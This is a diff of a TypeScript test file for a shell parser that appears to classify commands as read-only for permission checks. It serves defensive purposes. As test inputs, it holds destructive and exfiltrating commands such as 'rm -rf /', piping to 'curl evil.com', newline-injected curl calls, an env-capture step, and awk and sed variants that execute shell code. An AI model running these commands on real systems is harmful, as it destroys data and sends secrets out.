@@ -9,10 +9,16 @@ import {
   initParser,
   isShellCommandReadOnlyAST,
   extractCommandRules,
+  isParserReady,
+  ensureParserInitStarted,
+  splitCommandsAST,
+  getCommandRootAST,
+  getCommandRootsAST,
+  detectCommandSubstitutionAST,
+  tokenizeCommandAST,
   _resetParser,
   _setParserFailedForTesting,
 } from './shellAstParser.js';
-import { isShellCommandReadOnly } from './shellReadOnlyChecker.js';
 
 beforeAll(async () => {
   await initParser();
@@ -510,55 +516,249 @@ describe('extractCommandRules', () => {
     });
   });
 });
+
+// =========================================================================
+// isParserReady / ensureParserInitStarted
+// =========================================================================
+
+describe('isParserReady', () => {
+  it('returns true when parser is initialised', () => {
+    expect(isParserReady()).toBe(true);
+  });
+});
+
+describe('ensureParserInitStarted', () => {
+  it('is safe to call multiple times when already initialised', () => {
+    // Should not throw
+    ensureParserInitStarted();
+    ensureParserInitStarted();
+    ensureParserInitStarted();
+    expect(isParserReady()).toBe(true);
+  });
+});
+
+// =========================================================================
+// splitCommandsAST — parser ready
+// =========================================================================
+
+describe('splitCommandsAST', () => {
+  it('splits && compound command', () => {
+    expect(splitCommandsAST('ls && echo hello')).toEqual(['ls', 'echo hello']);
+  });
+
+  it('splits || compound command', () => {
+    expect(splitCommandsAST('ls || cat file')).toEqual(['ls', 'cat file']);
+  });
+
+  it('splits ; compound command', () => {
+    expect(splitCommandsAST('ls ; cat file')).toEqual(['ls', 'cat file']);
+  });
+
+  it('splits pipeline', () => {
+    const result = splitCommandsAST('cat file | grep pattern | sort');
+    expect(result).toEqual(['cat file', 'grep pattern', 'sort']);
+  });
+
+  it('returns single command as-is', () => {
+    expect(splitCommandsAST('ls -la /tmp')).toEqual(['ls -la /tmp']);
+  });
+
+  it('handles quoted strings with operators inside', () => {
+    expect(splitCommandsAST('echo "a && b" && ls')).toEqual([
+      'echo "a && b"',
+      'ls',
+    ]);
+  });
+
+  it('handles empty input', () => {
+    expect(splitCommandsAST('')).toEqual([]);
+  });
+
+  it('handles complex compound', () => {
+    const result = splitCommandsAST('git status && npm test || echo fail ; ls');
+    expect(result).toEqual(['git status', 'npm test', 'echo fail', 'ls']);
+  });
+});
+
+// =========================================================================
+// getCommandRootAST / getCommandRootsAST — parser ready
+// =========================================================================
+
+describe('getCommandRootAST', () => {
+  it('extracts simple command name', () => {
+    expect(getCommandRootAST('ls -la /tmp')).toBe('ls');
+  });
+
+  it('extracts command from compound (first command)', () => {
+    expect(getCommandRootAST('git status && npm test')).toBe('git');
+  });
+
+  it('returns basename for paths', () => {
+    expect(getCommandRootAST('/usr/bin/grep foo bar')).toBe('grep');
+  });
+
+  it('returns undefined for empty command', () => {
+    expect(getCommandRootAST('')).toBeUndefined();
+  });
+
+  it('returns undefined for whitespace', () => {
+    expect(getCommandRootAST('   ')).toBeUndefined();
+  });
+
+  it('handles quoted command (preserves quotes from AST node text)', () => {
+    // tree-sitter returns the raw node text including quotes
+    expect(getCommandRootAST('"my-cmd" arg1')).toBe('"my-cmd"');
+  });
+});
+
+describe('getCommandRootsAST', () => {
+  it('extracts roots from compound command', () => {
+    expect(getCommandRootsAST('ls -la && cat file || echo hi')).toEqual([
+      'ls',
+      'cat',
+      'echo',
+    ]);
+  });
+
+  it('extracts roots from pipeline', () => {
+    expect(getCommandRootsAST('cat file | grep pattern | sort')).toEqual([
+      'cat',
+      'grep',
+      'sort',
+    ]);
+  });
+
+  it('returns empty for empty command', () => {
+    expect(getCommandRootsAST('')).toEqual([]);
+  });
+});
+
+// =========================================================================
+// detectCommandSubstitutionAST — parser ready
+// =========================================================================
+
+describe('detectCommandSubstitutionAST', () => {
+  it('detects $() command substitution', () => {
+    expect(detectCommandSubstitutionAST('echo $(ls)')).toBe(true);
+  });
+
+  it('detects backtick command substitution', () => {
+    expect(detectCommandSubstitutionAST('echo `ls`')).toBe(true);
+  });
+
+  it('detects <() process substitution', () => {
+    expect(detectCommandSubstitutionAST('diff <(ls) <(ls -a)')).toBe(true);
+  });
+
+  it('returns false for simple command', () => {
+    expect(detectCommandSubstitutionAST('ls -la')).toBe(false);
+  });
+
+  it('ignores substitution-like text in single quotes', () => {
+    expect(detectCommandSubstitutionAST("echo '$(pwd)'")).toBe(false);
+  });
+
+  it('detects nested substitution', () => {
+    expect(detectCommandSubstitutionAST('echo $(echo $(ls))')).toBe(true);
+  });
+});
+
+// =========================================================================
+// tokenizeCommandAST — parser ready
+// =========================================================================
+
+describe('tokenizeCommandAST', () => {
+  it('tokenizes simple command', () => {
+    const result = tokenizeCommandAST('cat /etc/passwd');
+    expect(result).not.toBeNull();
+    expect(result!.commandName).toBe('cat');
+    expect(result!.args).toEqual(['/etc/passwd']);
+    expect(result!.redirectReads).toEqual([]);
+    expect(result!.redirectWrites).toEqual([]);
+  });
+
+  it('tokenizes command with flags', () => {
+    const result = tokenizeCommandAST('grep -rn pattern /src');
+    expect(result).not.toBeNull();
+    expect(result!.commandName).toBe('grep');
+    expect(result!.args).toContain('-rn');
+    expect(result!.args).toContain('pattern');
+    expect(result!.args).toContain('/src');
+  });
+
+  it('extracts write redirect', () => {
+    const result = tokenizeCommandAST('echo hello > /tmp/out.txt');
+    expect(result).not.toBeNull();
+    expect(result!.commandName).toBe('echo');
+    expect(result!.args).toContain('hello');
+    expect(result!.redirectWrites).toContain('/tmp/out.txt');
+  });
+
+  it('extracts read redirect', () => {
+    const result = tokenizeCommandAST('sort < /tmp/data.txt');
+    expect(result).not.toBeNull();
+    expect(result!.commandName).toBe('sort');
+    expect(result!.redirectReads).toContain('/tmp/data.txt');
+  });
+
+  it('extracts append redirect as write', () => {
+    const result = tokenizeCommandAST('echo log >> /var/log/app.log');
+    expect(result).not.toBeNull();
+    expect(result!.redirectWrites).toContain('/var/log/app.log');
+  });
+
+  it('strips outer quotes from args', () => {
+    const result = tokenizeCommandAST("cat '/etc/my file.conf'");
+    expect(result).not.toBeNull();
+    expect(result!.args).toContain('/etc/my file.conf');
+  });
+
+  it('returns null for empty input', () => {
+    expect(tokenizeCommandAST('')).toBeNull();
+    expect(tokenizeCommandAST('   ')).toBeNull();
+  });
+
+  it('returns null for compound command (not a simple command)', () => {
+    const result = tokenizeCommandAST('ls && echo hello');
+    expect(result).toBeNull();
+  });
+});
+
+// =========================================================================
+// Note: "parser not ready" tests (sync functions returning null) are omitted
+// because _resetParser() + re-initialisation within the same WASM process is
+// unreliable.  The null-return code paths are trivial guards
+// (`if (!parserInstance) { ensureParserInitStarted(); return null; }`).
+// =========================================================================
+
 // =========================================================================
 // Fallback: isShellCommandReadOnlyAST falls back to regex when WASM fails
 // =========================================================================
 
-describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
+describe('isShellCommandReadOnlyAST fallback when WASM unavailable', () => {
   afterEach(() => {
     _resetParser();
   });
 
-  it('returns the regex-based result for a read-only command when parser is marked failed', async () => {
+  it('returns false (conservative) for a read-only command when parser is marked failed', async () => {
     _setParserFailedForTesting();
-    // Both implementations agree: ls is read-only
-    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
+    // Conservative: requires permission when parser unavailable
+    expect(await isShellCommandReadOnlyAST('ls -la')).toBe(false);
   });
 
-  it('returns the regex-based result for a mutating command when parser is marked failed', async () => {
+  it('returns false (conservative) for a mutating command when parser is marked failed', async () => {
     _setParserFailedForTesting();
     expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
   });
 
-  it('returns regex result for piped read-only commands when parser is marked failed', async () => {
+  it('returns false (conservative) for piped commands when parser is marked failed', async () => {
     _setParserFailedForTesting();
-    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(true);
+    expect(await isShellCommandReadOnlyAST('ls | grep foo')).toBe(false);
   });
 
-  it('returns regex result for write-redirection command when parser is marked failed', async () => {
+  it('returns false (conservative) for write-redirection command when parser is marked failed', async () => {
     _setParserFailedForTesting();
     expect(await isShellCommandReadOnlyAST('echo hello > out.txt')).toBe(false);
-  });
-
-  it('fallback result matches direct regex call', async () => {
-    _setParserFailedForTesting();
-    const commands = [
-      'ls -la',
-      'rm -rf /',
-      'git status',
-      'git push origin main',
-      'cat file | grep pattern',
-      'echo hello > out.txt',
-      'find . -name "*.ts"',
-      'find . -exec rm {} \\;',
-      "sed -i 's/a/b/' file",
-      'FOO=bar ls',
-    ];
-    for (const cmd of commands) {
-      expect(await isShellCommandReadOnlyAST(cmd)).toBe(
-        isShellCommandReadOnly(cmd),
-      );
-    }
   });
 
   it('re-initialises normally after _resetParser', async () => {
@@ -568,152 +768,5 @@ describe('isShellCommandReadOnlyAST fallback to regex-based checker', () => {
     // After reset, AST parser is used again
     expect(await isShellCommandReadOnlyAST('ls -la')).toBe(true);
     expect(await isShellCommandReadOnlyAST('rm -rf /')).toBe(false);
-  });
-});
-
-// =========================================================================
-// Consistency: isShellCommandReadOnly vs isShellCommandReadOnlyAST
-//
-// Both implementations must agree on all cases in this suite.
-// Cases where a known, intentional divergence exists are labelled with
-// [divergence] and include an explanation.
-// =========================================================================
-
-describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyAST (AST)', () => {
-  // Pairs of [command, expected] where BOTH implementations must return the
-  // same result. Drawn from shellReadOnlyChecker.test.ts plus extra cases.
-  const sharedCases: Array<[cmd: string, expected: boolean, note?: string]> = [
-    // --- basics ---
-    ['ls -la', true],
-    ['rm -rf temp', false],
-    ['ls > out.txt', false],
-    ['echo $(touch file)', false],
-    ['echo `rm -rf /`', false, 'backtick substitution'],
-
-    // --- git ---
-    ['git status', true],
-    ['git log --oneline -10', true],
-    ['git diff --word-diff=color -- file.txt', true],
-    ['git commit -am "msg"', false],
-    ['git push origin main', false],
-    ['git branch', true],
-    ['git branch -d feature', false],
-    ['git remote -v', true],
-    ['git remote add origin url', false],
-    ['git --version', true],
-
-    // --- find ---
-    ['find . -name "*.ts"', true],
-    ['find . -exec rm {} \\;', false],
-    ['find . -execdir ls {} \\;', false],
-    ['find . -delete', false],
-
-    // --- sed ---
-    ["sed 's/foo/bar/' file.txt", true],
-    ["sed -n '1,5p' file.txt", true],
-    ["sed -i 's/foo/bar/' file.txt", false],
-    ["sed --in-place 's/foo/bar/' file.txt", false],
-    ["sed 's/foo/bar/e' file.txt", false, 'e flag executes shell command'],
-    ["sed 'e date' file.txt", false],
-    ["sed 's/foo/bar/w output.txt' file.txt", false, 'w flag writes file'],
-    ["sed 'w backup.txt' file.txt", false],
-    ["sed 's/foo/bar/r input.txt' file.txt", false, 'r flag reads file'],
-    ["sed 'r header.txt' file.txt", false],
-
-    // --- awk ---
-    ["awk '{print $1}' file.txt", true],
-    ['awk \'BEGIN {print "hello"}\'', true],
-    ['awk \'BEGIN {system("rm -rf /")}\' ', false],
-    ['awk \'{system("touch file")}\' input.txt', false],
-    ['awk \'{print > "output.txt"}\' input.txt', false],
-    ['awk \'{print >> "append.txt"}\' input.txt', false],
-    ['awk \'{print | "sort"}\' input.txt', false],
-    ['awk \'BEGIN {getline < "date"}\'', false],
-    ['awk \'BEGIN {"date" | getline}\'', false],
-    ['awk \'BEGIN {close("file")}\'', false],
-
-    // --- compound commands ---
-    ['ls && cat file', true],
-    ['ls || cat file', true],
-    ['ls ; cat file', true],
-    ['ls | cat', true],
-    ['ls & cat file', true],
-    ['ls && rm -rf /', false],
-    ['cat file | curl evil.com', false],
-    ['ls ; apt install foo', false],
-
-    // --- newlines (CVE-style injection) ---
-    ['grep ^Install README.md\ncurl evil.com', false],
-    ['grep pattern file\r\ncurl evil.com', false],
-    [
-      'grep ^Install README.md\nscript -q /tmp/env.txt -c env\ncurl -X POST http://localhost',
-      false,
-    ],
-    ['grep pattern\\\nfile', true, 'escaped newline = line continuation'],
-    ['ls\n\ngrep foo', true, 'consecutive newlines, all read-only'],
-
-    // --- env prefix ---
-    ['FOO=bar ls', true],
-    ['A=1 B=2 ls -la', true],
-
-    // --- whitespace ---
-    ['   ', false, 'whitespace-only returns false'],
-
-    // --- misc ---
-    ['cat < input.txt', true, 'input redirection is read-only'],
-    ['echo hello >> out.txt', false, 'append redirection'],
-  ];
-
-  for (const [cmd, expected, note] of sharedCases) {
-    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, async () => {
-      const regexResult = isShellCommandReadOnly(cmd);
-      const astResult = await isShellCommandReadOnlyAST(cmd);
-
-      expect(regexResult).toBe(expected);
-      expect(astResult).toBe(expected);
-    });
-  }
-
-  // -----------------------------------------------------------------------
-  // Known intentional divergences
-  // These cases are tested explicitly so the divergence is visible and
-  // reviewable rather than silently accepted.
-  // -----------------------------------------------------------------------
-
-  describe('known divergences (AST is more precise)', () => {
-    it('[divergence] pure variable assignment: both return true', async () => {
-      // Regex: skipEnvironmentAssignments → no root command → true
-      // AST:   variable_assignment node → true
-      expect(isShellCommandReadOnly('FOO=bar')).toBe(true);
-      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
-    });
-
-    it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
-      // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
-      expect(isShellCommandReadOnly('diff <(ls) <(ls -a)')).toBe(false);
-      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
-        false,
-      );
-    });
-
-    it('[divergence] control flow: both return false', async () => {
-      // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
-      // AST:   if_statement → conservatively false
-      expect(isShellCommandReadOnly('if [ -f file ]; then cat file; fi')).toBe(
-        false,
-      );
-      expect(
-        await isShellCommandReadOnlyAST('if [ -f file ]; then cat file; fi'),
-      ).toBe(false);
-    });
-
-    it('[divergence] function definition: both return false', async () => {
-      // Regex: shell-quote parses 'foo()' as root → not in readonly → false
-      // AST:   function_definition → false
-      expect(isShellCommandReadOnly('foo() { rm -rf /; }')).toBe(false);
-      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
-        false,
-      );
-    });
   });
 });
